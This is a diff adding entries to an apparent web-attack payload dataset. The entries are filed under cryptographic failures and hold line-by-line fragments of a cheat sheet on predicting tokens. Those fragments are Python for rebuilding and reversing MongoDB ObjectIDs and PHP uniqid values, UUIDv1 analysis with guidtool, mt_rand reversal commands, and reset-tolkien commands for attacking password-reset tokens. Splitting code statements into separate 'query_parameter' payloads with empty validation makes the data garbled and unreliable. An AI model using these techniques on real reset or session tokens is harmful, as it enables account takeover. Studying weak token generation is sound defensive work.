@@ -39433,5 +39433,588 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-241007",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import random",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241008",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import time",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241009",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "seed = int(time.time())",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241010",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "random.seed(seed)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241011",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(random.randint(1, 100))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241012",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241013",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241014",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UUID version: 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241015",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UUID time: 2022-04-13 08:06:13.202186",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241016",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UUID timestamp: 138691299732021860",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241017",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UUID node: 91754721024",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241018",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UUID MAC address: 00:15:5d:01:ef:00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241019",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "UUID clock sequence: 2099",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241020",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241021",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./mongo-objectid-predict 5ae9b90a2c144b9def01ec37",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241022",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "5ae9bac82c144b9def01ec39",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241023",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "5ae9bacf2c144b9def01ec3a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241024",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "5ae9bada2c144b9def01ec3b",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241025",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "def MongoDB_ObjectID(timestamp, process, counter):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241026",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return \"%08x%10x%06x\" % (",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241027",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "timestamp,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241028",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "process,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241029",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "counter,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241030",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "def reverse_MongoDB_ObjectID(token):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241031",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "timestamp = int(token[0:8], 16)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241032",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "process = int(token[8:18], 16)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241033",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "counter = int(token[18:24], 16)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241034",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return timestamp, process, counter",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241035",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "def check(token):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241036",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "(timestamp, process, counter) = reverse_MongoDB_ObjectID(token)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241037",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "MongoDB",
+    "injection_point": "query_parameter",
+    "payload_string": "return token == MongoDB_ObjectID(timestamp, process, counter)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241038",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tokens = [\"5ae9b90a2c144b9def01ec37\", \"5ae9bac82c144b9def01ec39\"]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241039",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "for token in tokens:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241040",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(f\"{token}: {timestamp} - {process} - {counter}\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241041",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import math",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241042",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "import datetime",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241043",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "def uniqid(timestamp: float) -> str:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241044",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sec = math.floor(timestamp)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241045",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "usec = round(1000000 * (timestamp - sec))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241046",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return \"%8x%05x\" % (sec, usec)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241047",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "def reverse_uniqid(value: str) -> float:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241048",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sec = int(value[:8], 16)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241049",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "usec = int(value[8:], 16)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241050",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "return float(f\"{sec}.{usec}\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241051",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tokens = [\"6659cea087cd6\" , \"6659cea087cea\"]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241052",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "t = float(reverse_uniqid(token))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241053",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "d = datetime.datetime.fromtimestamp(t)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241054",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(f\"{token} - {t} => {d}\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241055",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./display_mt_rand.php 12345678 123",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241056",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "712530069 674417379",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241057",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "./reverse_mt_rand.py 712530069 674417379 123 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241058",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "reset-tolkien detect 660430516ffcf -d \"Wed, 27 Mar 2024 14:42:25 GMT\" --prefixes \"attacker@example.com\" --suffixes \"attacker@example.com\" --timezone \"-7\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-241059",
+    "vulnerability_category": "Cryptographic Failures",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format=\"uniqid\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
